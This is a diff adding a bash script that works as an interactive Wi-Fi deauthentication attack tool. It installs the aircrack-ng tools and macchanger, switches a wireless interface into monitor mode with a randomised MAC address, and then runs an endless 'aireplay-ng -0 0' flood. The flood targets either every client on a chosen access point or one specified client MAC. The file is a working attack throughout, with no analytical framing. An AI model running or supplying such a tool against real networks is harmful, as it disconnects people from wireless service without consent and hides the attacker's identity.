@@ -1,0 +1,75 @@
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+	printf "Please run as root\n"
+	exit 1
+fi
+
+menu=("Deauth attack (all)" "Deauth attack (specified)" "Reset" "Exit")
+trap 'reset;printf "Exitting, received signal 1\n";exit 1' 1 2 3 15 19
+
+[ ! -x "$(command -v airmon-ng)" ] && (sudo pacman -S airmon-ng)
+[ ! -x "$(command -v macchanger)" ] && (sudo pacman -S macchanger)
+start() {
+	#banner
+	PS3="> "
+	select option in "${menu[@]}"
+	do
+		case $option in
+		"Deauth attack (all)") deauthall="1";;
+		"Deauth attack (specified)") deauthall="0";;
+		"Reset") get_interface ; reset ; exit 0 ;;
+		"Exit") exit ;;
+		esac
+		break
+	done
+}
+reset() {
+	clear
+	sleep 3
+	ifconfig $interface down >> /dev/null 2>&1
+	macchanger -p $interface >> /dev/null 2>&1
+	iwconfig $interface mode managed >> /dev/null 2>&1
+	ifconfig $interface up >> /dev/null 2>&1
+	clear
+	rm -f .interf.tmp
+	sleep 1
+	systemctl restart NetworkManager
+	systemctl restart wpa_supplicant
+	printf "All clear!\n"
+}
+
+monitor_mode () {
+	ifconfig $interface down
+	iwconfig $interface mode monitor
+	# Change MAC Address
+	macchanger -r $interface
+	ifconfig $interface up
+	printf "Preparing...\n"
+}
+
+get_interface() {
+ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > "$HOME/.interf.tmp"
+select interface in $(cat "$HOME/.interf.tmp"); do
+monitor_mode
+break
+done
+}
+
+start
+PS3="Select your network interface: "
+get_interface
+sudo airmon-ng check kill
+read -p "Enter wifi BSSID: " bssid
+read -p "Enter wifi Channel: " chan
+airmon-ng start $interface $chan
+case $deauthall in
+"1")
+printf "Starting up!\n"
+aireplay-ng  -0 0 -a $bssid $interface ;;
+"0")
+read -p "Enter target Mac address: " trg
+aireplay-ng -0 0 -a $bssid -c $trg $interface
+;;
+esac
+airmon-ng stop $interface $chan
